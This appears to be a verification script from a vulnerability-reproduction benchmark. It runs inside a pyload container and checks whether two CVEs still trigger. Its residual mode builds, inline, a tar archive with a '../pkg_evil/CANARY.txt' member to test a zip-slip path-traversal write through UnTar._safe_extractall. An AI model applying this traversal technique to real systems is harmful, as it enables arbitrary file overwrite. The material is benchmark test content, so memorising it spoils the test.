#!/usr/bin/env bash
# verify.sh --seed|--residual — 0=效果发生(flag出现) 10=未发生 20=环境失败 30=参数错误
# seed: CVE-2026-32808 SevenZip.verify join-then-remove (poc/seed_exec.py)
# residual: CVE-2026-35592 UnTar._safe_extractall commonprefix zip-slip (inline)
# Both trigger the installed package inside the running pyload container.
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"
export PCB_FLAG="${PCB_FLAG:-$RUN_FLAG}"
SVC="$VERSION"
CID="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" ps -q "$SVC" 2>/dev/null | head -1 | tr -d '[:space:]')"
if [[ -z "$CID" ]]; then
  echo "verify: container $SVC not running" >&2
  exit 20
fi
export PCB_CONTAINER_ID="$CID"
CPORT="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
CPORT="${CPORT:-8000}"
PORT="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$SVC" "$CPORT" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
export PCB_TARGET_PORT="${PORT:-}"
if [[ "$MODE" == "--seed" ]]; then
  CAND="$("$PY" "$CASE_DIR/poc/original_poc.py" "$VERSION" 2>/dev/null || "$PY" "$CASE_DIR/poc/original_poc.py" 2>/dev/null)"
  CAND="${CAND:-"{}"}"
  CAND="$("$PY" -c "import json,sys
s = sys.argv[1]
try:
    json.loads(s)
    print(s)
except Exception:
    print(json.dumps({'path': s.strip(), 'to': s.strip(), 'payload': s.strip(), 'css': s.strip()}))" "$CAND")"
  printf '%s' "$CAND" > "$WORK_DIR/cand.json"
  export PYTHONPATH="$CASE_DIR${PYTHONPATH:+:$PYTHONPATH}"
  OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
else
  # residual (CVE-2026-35592): tar member ../pkg_evil/CANARY.txt escapes via
  # os.path.commonprefix (V1 still open). Inline literal only — no heldout refs.
  # Calls installed UnTar._safe_extractall from site-packages of the running pyload.
  printf '%s' '{"probe_id":"cve-2026-35592-untar-zipslip","sink":"residual","entry":"../pkg_evil/CANARY.txt"}' > "$WORK_DIR/cand.json"
  OUT="$(docker exec -i "$CID" python3 - <<'PY'
import io, json, os, shutil, tarfile
from pyload.plugins.extractors.UnTar import _safe_extractall
import pyload.plugins.extractors.UnTar as untar_mod

flag = os.environ.get("PCB_FLAG", "")
dl = "/data/dl"
dest = os.path.join(dl, "pkg")
oob = os.path.join(dl, "pkg_evil", "CANARY.txt")
shutil.rmtree(dl, ignore_errors=True)
os.makedirs(dest, exist_ok=True)
payload = ("ZIPSLIP-WRITE " + flag).encode()
tar_path = "/tmp/pcb_residual.tar"
with tarfile.open(tar_path, "w") as tf:
    info = tarfile.TarInfo(name="../pkg_evil/CANARY.txt")
    info.size = len(payload)
    tf.addfile(info, io.BytesIO(payload))
error = ""
try:
    with tarfile.open(tar_path, "r") as t:
        _safe_extractall(t, dest)
except Exception as exc:
    error = "%s: %s" % (type(exc).__name__, exc)
oob_content = ""
if os.path.isfile(oob):
    with open(oob) as fh:
        oob_content = fh.read()
print(json.dumps({
    "sink": "untar_safe_extractall",
    "plugin": getattr(untar_mod, "__file__", ""),
    "escaped": bool(oob_content),
    "oob_content": oob_content,
    "error": error,
}))
PY
)" || { echo "$OUT" >&2; exit 20; }
fi
BODY="$(printf '%s' "$OUT" | "$PY" -c "import json,sys
try:
    d = json.load(sys.stdin)
    print(d.get('body') or d.get('fetched_body') or d.get('oob_content') or json.dumps(d, ensure_ascii=False))
except Exception:
    print('')" 2>/dev/null)"
echo "${BODY:0:500}"
if grep -q "$RUN_FLAG" <<<"$BODY"; then exit 0; else exit 10; fi
